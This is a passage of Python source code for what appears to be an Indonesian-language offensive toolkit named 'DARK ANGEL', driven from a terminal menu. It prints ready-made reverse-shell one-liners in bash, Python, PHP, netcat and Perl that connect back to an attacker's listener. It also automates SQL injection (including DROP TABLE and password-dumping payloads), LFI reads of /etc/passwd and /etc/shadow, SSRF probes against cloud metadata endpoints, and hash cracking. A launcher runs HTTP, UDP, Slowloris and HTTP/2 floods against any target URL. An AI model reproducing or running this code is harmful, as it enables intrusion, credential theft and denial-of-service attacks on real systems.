        print(f"  {R}✗ {e}{RST}")
    vinp("ENTER...")

def do_ping_sweep():
    print_icon()
    print(b_top("PING SWEEP")+"\n"+b_bot()+"\n")
    net=vinp("Network prefix (contoh: 192.168.1)")
    print(f"\n  {Y}Sweeping {W}{net}.0/24{Y}...{RST}\n")
    alive=[]; lock=threading.Lock()
    def ping(i):
        ip=f"{net}.{i}"
        r=subprocess.run(["ping","-c","1","-W","1",ip],
                         capture_output=True)
        if r.returncode==0:
            try:    h=socket.gethostbyaddr(ip)[0]
            except: h=""
            with lock: alive.append((ip,h))
    threads=[threading.Thread(target=ping,args=(i,),daemon=True) for i in range(1,255)]
    for t in threads: t.start()
    for t in threads: t.join()
    rows=[b_top(f"PING SWEEP — {net}.0/24")]
    if not alive: rows.append(b_row(f"  {R}Tidak ada host alive.{RST}"))
    for ip,h in sorted(alive,key=lambda x:int(x[0].split(".")[-1])):
        rows.append(b_row(f"  {G}◉ {W}{ip:<16}{GR} {h[:24]}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

# ════════════════════════════════════
#  EXPLOIT TOOLKIT
# ════════════════════════════════════
def do_payload_gen():
    print_icon()
    print(b_top("PAYLOAD GENERATOR")+"\n"+b_bot()+"\n")
    lhost=vinp("LHOST (IP listener lo)")
    lport=vinp("LPORT (default 4444)") or "4444"
    print(f"""
{b_top("REVERSE SHELL PAYLOADS")}
{b_row(f"  {Y}── BASH ──────────────────────────────────────")}
{b_row(f"  {W}bash -i >& /dev/tcp/{lhost}/{lport} 0>&1{RST}")}
{b_sep()}
{b_row(f"  {Y}── PYTHON3 ───────────────────────────────────")}
{b_row(f"  {W}python3 -c 'import socket,subprocess,os;")}
{b_row(f"  {W}s=socket.socket();s.connect((\"{lhost}\",{lport}));")}
{b_row(f"  {W}os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);")}
{b_row(f"  {W}os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'")}
{b_sep()}
{b_row(f"  {Y}── PHP ───────────────────────────────────────")}
{b_row(f"  {W}php -r '$s=fsockopen(\"{lhost}\",{lport});")}
{b_row(f"  {W}exec(\"/bin/sh -i <&3 >&3 2>&3\");'")}
{b_sep()}
{b_row(f"  {Y}── NETCAT ────────────────────────────────────")}
{b_row(f"  {W}nc -e /bin/sh {lhost} {lport}{RST}")}
{b_sep()}
{b_row(f"  {Y}── PERL ─────────────────────────────────────")}
{b_row(f"  {W}perl -e 'use Socket;$i=\"{lhost}\";$p={lport};")}
{b_row(f"  {W}socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));")}
{b_row(f"  {W}connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");'")}
{b_sep()}
{b_row(f"  {C}Listener: {W}nc -lvnp {lport}{RST}")}
{b_bot()}""")
    vinp("ENTER...")

SQLI_PAYLOADS=[
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "' OR 'x'='x",
    "'; DROP TABLE users; --",
    "' UNION SELECT null,null,null --",
    "' UNION SELECT 1,version(),3 --",
    "' AND SLEEP(5) --",
    "' AND 1=2 UNION SELECT username,password,3 FROM users --",
    "1' ORDER BY 3 --",
    "admin'--",
    "' OR 1=1 LIMIT 1 --",
]

def do_sqli():
    print_icon()
    print(b_top("SQLi TESTER")+"\n"+b_bot()+"\n")
    url=vinp("Target URL (contoh: http://site.com/page.php?id=1)")
    param=vinp("Parameter target (contoh: id)")
    print(f"\n  {Y}Testing {len(SQLI_PAYLOADS)} payloads...{RST}\n")
    rows=[b_top(f"SQLi — {url[:30]}")]
    for pl in SQLI_PAYLOADS:
        try:
            test_url=url.replace(f"{param}=",f"{param}=") + "&" if "?" in url else url+"?"
            full=f"{url}&{param}={urllib.request.quote(pl)}" if "?" in url \
                 else f"{url}?{param}={urllib.request.quote(pl)}"
            req=urllib.request.Request(full,headers={"User-Agent":random.choice(UA)})
            with urllib.request.urlopen(req,timeout=5) as r:
                body=r.read(2048).decode(errors="ignore").lower()
            errs=["sql","mysql","syntax","error","warning","exception",
                  "unclosed","odbc","oracle","postgresql"]
            hit=any(e in body for e in errs)
            status=f"{G}HIT{RST}" if hit else f"{GR}miss{RST}"
            rows.append(b_row(f"  {status} {GR}{pl[:36]}{RST}"))
        except Exception as e:
            rows.append(b_row(f"  {Y}ERR {GR}{pl[:28]} {str(e)[:10]}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

DIR_WORDLIST=["admin","login","dashboard","upload","backup","config","test",
              ".env",".git","wp-admin","wp-login.php","phpmyadmin","api",
              "v1","v2","console","shell","manager","files","data","db",
              "assets","static","private","secret","hidden","old","temp",
              "robots.txt","sitemap.xml","README.md",".htaccess"]

def do_dirbust():
    print_icon()
    print(b_top("DIR BUSTER")+"\n"+b_bot()+"\n")
    base=vinp("Base URL (contoh: http://target.com)")
    threads_n=int(vinp("Threads (default 20)") or "20")
    print(f"\n  {Y}Busting {len(DIR_WORDLIST)} paths...{RST}\n")
    found=[]; lock=threading.Lock(); q=list(DIR_WORDLIST)
    def bust(path):
        url=f"{base.rstrip('/')}/{path}"
        try:
            req=urllib.request.Request(url,headers={"User-Agent":random.choice(UA)})
            with urllib.request.urlopen(req,timeout=4) as r:
                code=r.getcode()
                with lock: found.append((code,path))
        except urllib.error.HTTPError as e:
            if e.code not in (404,):
                with lock: found.append((e.code,path))
        except: pass
    threads=[threading.Thread(target=bust,args=(p,),daemon=True) for p in q]
    for t in threads: t.start()
    for t in threads: t.join()
    rows=[b_top(f"DIR BUST — {base[:30]}")]
    if not found: rows.append(b_row(f"  {R}Tidak ada path ditemukan.{RST}"))
    for code,path in sorted(found):
        cc=G if code==200 else (Y if code in(301,302,403) else R)
        rows.append(b_row(f"  {cc}{code} {W}{path}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

LFI_PAYLOADS=[
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/version",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
]

def do_lfi():
    print_icon()
    print(b_top("LFI PROBE")+"\n"+b_bot()+"\n")
    url=vinp("Target URL dengan param (misal: http://site.com/page.php?file=index)")
    param=vinp("Parameter file (misal: file)")
    rows=[b_top(f"LFI — {url[:30]}")]
    for pl in LFI_PAYLOADS:
        try:
            if "?" in url: full=f"{url}&{param}={urllib.request.quote(pl)}"
            else: full=f"{url}?{param}={urllib.request.quote(pl)}"
            req=urllib.request.Request(full,headers={"User-Agent":random.choice(UA)})
            with urllib.request.urlopen(req,timeout=5) as r:
                body=r.read(1024).decode(errors="ignore")
            hit=any(x in body for x in ["root:","daemon:","bin:","nobody:"])
            status=f"{R}{BLD}VULN{RST}" if hit else f"{GR}miss{RST}"
            rows.append(b_row(f"  {status} {GR}{pl[:36]}{RST}"))
        except Exception as e:
            rows.append(b_row(f"  {Y}ERR  {GR}{str(e)[:30]}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

SECURITY_HEADERS=["Strict-Transport-Security","Content-Security-Policy",
                  "X-Frame-Options","X-Content-Type-Options",
                  "Referrer-Policy","Permissions-Policy",
                  "X-XSS-Protection","Access-Control-Allow-Origin"]

def do_header_scan():
    print_icon()
    print(b_top("SECURITY HEADER AUDIT")+"\n"+b_bot()+"\n")
    url=vinp("Target URL")
    try:
        req=urllib.request.Request(url,headers={"User-Agent":random.choice(UA)})
        with urllib.request.urlopen(req,timeout=8) as r:
            hdrs=dict(r.headers)
        rows=[b_top(f"HEADERS — {url[:28]}")]
        for h in SECURITY_HEADERS:
            val=hdrs.get(h,"") or hdrs.get(h.lower(),"")
            if val:
                rows.append(b_row(f"  {G}✓ {DC}{h[:28]}{GR} {val[:14]}{RST}"))
            else:
                rows.append(b_row(f"  {R}✗ {GR}{h[:36]}{RST} {Y}MISSING{RST}"))
        rows.append(b_sep())
        for k,v in hdrs.items():
            rows.append(b_row(f"  {GR}{k[:20]:<20}: {v[:20]}{RST}"))
        rows.append(b_bot()); print("\n".join(rows))
    except Exception as e:
        print(f"  {R}✗ {e}{RST}")
    vinp("ENTER...")

def do_cookie_grab():
    print_icon()
    print(b_top("COOKIE GRABBER")+"\n"+b_bot()+"\n")
    url=vinp("Target URL")
    try:
        req=urllib.request.Request(url,headers={"User-Agent":random.choice(UA)})
        with urllib.request.urlopen(req,timeout=8) as r:
            cookies=r.headers.get_all("Set-Cookie") or []
        rows=[b_top(f"COOKIES — {url[:28]}")]
        if not cookies:
            rows.append(b_row(f"  {Y}Tidak ada Set-Cookie header.{RST}"))
        for ck in cookies:
            rows.append(b_row(f"  {G}◉ {W}{ck[:40]}{RST}"))
            # flags
            flags=[]
            if "HttpOnly" in ck: flags.append(f"{G}HttpOnly{RST}")
            else:                flags.append(f"{R}!HttpOnly{RST}")
            if "Secure"   in ck: flags.append(f"{G}Secure{RST}")
            else:                flags.append(f"{R}!Secure{RST}")
            if "SameSite" in ck: flags.append(f"{G}SameSite{RST}")
            rows.append(b_row(f"    {' '.join(flags)}"))
        rows.append(b_bot()); print("\n".join(rows))
    except Exception as e:
        print(f"  {R}✗ {e}{RST}")
    vinp("ENTER...")

SSRF_PAYLOADS=[
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:3306/",
]

def do_ssrf():
    print_icon()
    print(b_top("SSRF PROBE")+"\n"+b_bot()+"\n")
    url=vinp("Target URL dengan param URL (misal: http://site.com/fetch?url=)")
    param=vinp("Parameter URL (misal: url)")
    rows=[b_top(f"SSRF — {url[:30]}")]
    for pl in SSRF_PAYLOADS:
        try:
            if "?" in url: full=f"{url}&{param}={urllib.request.quote(pl)}"
            else:          full=f"{url}?{param}={urllib.request.quote(pl)}"
            req=urllib.request.Request(full,headers={"User-Agent":random.choice(UA)})
            with urllib.request.urlopen(req,timeout=5) as r:
                code=r.getcode()
                body=r.read(256).decode(errors="ignore")
            hit=code==200 and len(body)>10
            status=f"{R}{BLD}HIT{RST}" if hit else f"{GR}miss{RST}"
            rows.append(b_row(f"  {status} {GR}{pl[:36]}{RST}"))
        except Exception as e:
            rows.append(b_row(f"  {Y}ERR  {GR}{str(e)[:30]}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

# ════════════════════════════════════
#  CRYPTO / ENCODE
# ════════════════════════════════════
def do_hash_crack():
    print_icon()
    print(b_top("HASH CRACKER")+"\n"+b_bot()+"\n")
    h=vinp("Hash target (MD5/SHA1/SHA256)").lower().strip()
    wl=vinp("Wordlist path (ENTER=common list)")
    words=[]
    if wl and os.path.exists(wl):
        with open(wl) as f: words=[l.strip() for l in f]
    else:
        words=["password","123456","admin","root","test","qwerty",
               "letmein","monkey","dragon","master","sunshine","pass",
               "shadow","superman","batman","darkangel","1234","password1",
               "abc123","iloveyou","welcome","login","secret","12345678"]
    found=None
    hl=len(h)
    algo="md5" if hl==32 else ("sha1" if hl==40 else "sha256")
    print(f"\n  {Y}Cracking {algo.upper()} — {len(words)} words...{RST}\n")
    for w in words:
        if algo=="md5":    hh=hashlib.md5(w.encode()).hexdigest()
        elif algo=="sha1": hh=hashlib.sha1(w.encode()).hexdigest()
        else:              hh=hashlib.sha256(w.encode()).hexdigest()
        if hh==h: found=w; break
    rows=[b_top(f"HASH CRACK — {algo.upper()}")]
    rows.append(b_row(f"  {DC}Hash  {GR}: {GR}{h[:40]}{RST}"))
    if found:
        rows.append(b_row(f"  {G}{BLD}CRACKED: {W}{found}{RST}"))
    else:
        rows.append(b_row(f"  {R}Tidak ditemukan dalam wordlist.{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

def do_base64():
    print_icon()
    print(b_top("BASE64 ENCODE / DECODE")+"\n"+b_bot()+"\n")
    mode=vinp("Mode: e=encode, d=decode")
    data=vinp("Input")
    try:
        if mode.lower().startswith("e"):
            result=base64.b64encode(data.encode()).decode()
            label="ENCODED"
        else:
            result=base64.b64decode(data.encode()).decode(errors="ignore")
            label="DECODED"
        rows=[b_top(f"BASE64 — {label}")]
        # split output per 40 char
        for i in range(0,len(result),40):
            rows.append(b_row(f"  {W}{result[i:i+40]}{RST}"))
        rows.append(b_bot()); print("\n".join(rows))
    except Exception as e:
        print(f"  {R}✗ {e}{RST}")
    vinp("ENTER...")

def do_hash_gen():
    print_icon()
    print(b_top("HASH GENERATOR")+"\n"+b_bot()+"\n")
    data=vinp("Input string")
    rows=[b_top("HASH OUTPUT")]
    rows.append(b_row(f"  {Y}MD5    {GR}: {W}{hashlib.md5(data.encode()).hexdigest()}{RST}"))
    rows.append(b_row(f"  {Y}SHA1   {GR}: {W}{hashlib.sha1(data.encode()).hexdigest()}{RST}"))
    rows.append(b_row(f"  {Y}SHA256 {GR}: {W}{hashlib.sha256(data.encode()).hexdigest()[:40]}{RST}"))
    rows.append(b_row(f"  {Y}SHA512 {GR}: {W}{hashlib.sha512(data.encode()).hexdigest()[:40]}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

def do_xor():
    print_icon()
    print(b_top("XOR CIPHER")+"\n"+b_bot()+"\n")
    data=vinp("Input string")
    key=vinp("Key (1 char atau string)")
    if not key: key="A"
    result="".join(chr(ord(c)^ord(key[i%len(key)])) for i,c in enumerate(data))
    hex_r=" ".join(f"{ord(c):02x}" for c in result)
    rows=[b_top("XOR OUTPUT")]
    rows.append(b_row(f"  {Y}Raw    {GR}: {W}{result[:38]}{RST}"))
    rows.append(b_row(f"  {Y}Hex    {GR}: {W}{hex_r[:38]}{RST}"))
    rows.append(b_row(f"  {Y}B64    {GR}: {W}{base64.b64encode(result.encode(errors='replace')).decode()[:38]}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

# ════════════════════════════════════
#  FLOOD CONFIG + LAUNCH
# ════════════════════════════════════
FMAP={"1":"HTTP Flood","2":"UDP  Flood","3":"Slowloris","4":"HTTP/2","5":"Combo"}

def flood_config(mode_name):
    print_icon()
    print("\n"+b_top(f"CONFIG — {mode_name}")+"\n"+b_bot()+"\n")
    url =vinp("Target URL")
    thr =vinp("Threads (default 200)")
    dur =vinp("Durasi detik (0=infinite)")
    meth="GET"; pkt=1024
    if mode_name=="HTTP Flood":
        m=vinp("Method GET/POST (default GET)").upper()
        meth=m if m in("GET","POST") else "GET"
    if mode_name in("UDP  Flood","Combo"):
        p=vinp("Ukuran paket UDP (default 1024)")
        pkt=int(p) if p.isdigit() else 1024
    return {"target":url or "http://localhost",
            "threads":int(thr) if thr.isdigit() else 200,
            "duration":int(dur) if dur.isdigit() else 0,
            "method":meth,"packet":pkt,"mode":mode_name}

def launch_flood(cfg):
    reset_st()
    url=cfg["target"]
    parsed=urlparse(url if "://" in url else "http://"+url)
    host=parsed.hostname or "localhost"
    path=parsed.path or "/"
    ssl_on=parsed.scheme=="https"
    port=parsed.port or (443 if ssl_on else 80)
    try: socket.gethostbyname(host)
    except:
        print(f"\n  {R}✗ Host tidak bisa diresolve: {host}{RST}")
        vinp("ENTER..."); return
    n=cfg["threads"]
    for i in range(n):
        m=cfg["mode"]
        if m=="HTTP Flood":
            t=threading.Thread(target=http_worker,
              args=(host,port,path,cfg["method"],ssl_on),daemon=True)
        elif m=="UDP  Flood":
            t=threading.Thread(target=udp_worker,
              args=(host,port,cfg["packet"]),daemon=True)
        elif m=="Slowloris":
            if i>=max(n//10,4): continue
            t=threading.Thread(target=slow_worker,
              args=(host,port,ssl_on),daemon=True)
        elif m=="HTTP/2":
            t=threading.Thread(target=h2_worker,
              args=(host,port,path,ssl_on),daemon=True)
        elif m=="Combo":
            if i<int(n*0.6):
                t=threading.Thread(target=http_worker,
                  args=(host,port,path,"GET",ssl_on),daemon=True)
            else:
                t=threading.Thread(target=udp_worker,
                  args=(host,port,cfg["packet"]),daemon=True)
        else: continue
        t.start()
    if cfg["duration"]>0:
        def _s(): time.sleep(cfg["duration"]); stop_ev.set()
        threading.Thread(target=_s,daemon=True).start()
    try:    flood_dash(cfg,host,port)
    except: stop_ev.set()
    print_icon()
    with _lk: s=ST["sent"]; e=ST["errors"]; b=ST["bytes"]
    rows=[b_top("SELESAI")]
    rows.append(b_row(f"  {GR}├ {G}↑ {DC}Total Sent {GR}: {G}{s:>12,}{RST}"))
    rows.append(b_row(f"  {GR}├ {R}✗ {DC}Total Err  {GR}: {R}{e:>12,}{RST}"))
    rows.append(b_row(f"  {GR}╰ {B}≋ {DC}Data Sent  {GR}: {B}{b/1024/1024:>9.2f} MB{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER kembali ke menu...")

# ════════════════════════════════════
#  MAIN
# ════════════════════════════════════
def main():
    sys.stdout.write(HIDE)
    welcome()
    while True:
        ch=menu()
        if ch=="0":
            cls(); sys.stdout.write(SHOW)
            print(f"\n  {GR}DARK ANGEL — offline.{RST}\n"); sys.exit(0)
        elif ch in FMAP:
            cfg=flood_config(FMAP[ch])
            print_icon()
            mc=MC.get(cfg["mode"],W)
            print(f"\n  {Y}Target  : {W}{cfg['target']}")
            print(f"  {Y}Mode    : {mc}{cfg['mode']}")
            print(f"  {Y}Threads : {M}{cfg['threads']}")
            print(f"  {Y}Durasi  : {W}{cfg['duration'] or '∞'}s{RST}")
            vinp("ENTER → mulai  (Ctrl+C = stop)")
            launch_flood(cfg)
        elif ch=="6":  do_scan()
        elif ch=="7":  do_killer(False)
        elif ch=="8":  do_killer(True)
        elif ch=="9":  do_port_scan()
        elif ch=="10": do_dns()
        elif ch=="11": do_subdomain()
        elif ch=="12": do_banner()
        elif ch=="13": do_ping_sweep()
        elif ch=="14": do_payload_gen()
        elif ch=="15": do_sqli()
        elif ch=="16": do_dirbust()
        elif ch=="17": do_lfi()
        elif ch=="18": do_header_scan()
        elif ch=="19": do_cookie_grab()
        elif ch=="20": do_ssrf()
        elif ch=="21": do_hash_crack()
        elif ch=="22": do_base64()
        elif ch=="23": do_hash_gen()
        elif ch=="24": do_xor()

if __name__=="__main__":
    main()
